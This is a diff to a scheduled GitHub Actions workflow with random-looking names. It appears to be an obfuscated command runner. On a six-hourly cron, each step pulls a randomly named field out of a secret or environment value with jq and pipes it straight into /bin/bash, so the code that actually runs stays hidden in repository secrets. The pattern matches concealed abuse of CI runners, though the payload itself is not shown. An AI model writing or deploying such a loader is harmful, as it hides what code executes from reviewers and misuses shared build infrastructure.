@@ -2,24 +2,20 @@ name: jiangzehong1293
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 4/6 * * *'
+    - cron: '2 4/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: jiangzehong1293
         env:
-          twet75123: ${{ secrets.twet75123 }}
+          znz0656: ${{ secrets.znz0656 }}
         run: |
-          echo $twet75123 | jq -r .l45580 | /bin/bash
-          echo $rl4767 | jq -r .c6 | /bin/bash
-          echo $oukd326 | jq -r .toexk4773 | /bin/bash
-          echo $rvhv0 | jq -r .ojvxw1 | /bin/bash
-          echo $vnkjr2 | jq -r .sfj4 | /bin/bash
-          echo $c9 | jq -r .c786 | /bin/bash
-          echo $q1329 | jq -r .u6 | /bin/bash
-          echo $xepra57 | jq -r .uw25810 | /bin/bash
+          echo $znz0656 | jq -r .jhvjs0505 | /bin/bash
+          echo $xqya548 | jq -r .utaqz1 | /bin/bash
+          echo $tz05394 | jq -r .uktu2 | /bin/bash
+          echo $h1 | jq -r .ptxmz78 | /bin/bash
+          echo $tgror2 | jq -r .zuv005 | /bin/bash
 
